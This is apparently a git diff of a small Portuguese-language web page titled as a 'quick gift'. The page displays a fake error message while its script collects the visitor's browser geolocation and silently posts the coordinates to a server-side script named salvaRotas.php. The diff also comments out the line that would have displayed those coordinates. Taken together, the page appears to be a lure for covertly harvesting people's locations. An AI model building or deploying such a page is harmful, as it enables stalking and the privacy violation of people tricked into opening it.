@@ -1,13 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
+  <meta charset="utf-8">
+  <title>Presente rápido</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
-  
   <div class="content">
     <img src="hacker.svg" alt="">
     <p>OPS! Ocorreu um erro</p>
@@ -40,7 +43,7 @@
       }
 
       function showPosition(position) {
-          $.ajax({
+        $.ajax({
           url: 'salvaRotas.php',
           type: 'POST',
           data: {
@@ -48,14 +51,14 @@
             log: position.coords.longitude
           },
           success: function (data) {
-           // 
+            // 
           },
           error: function () {
             //
           }
         });
 
-        console.log("Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude);
+        // console.log("Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude);
       }
     });
   </script>
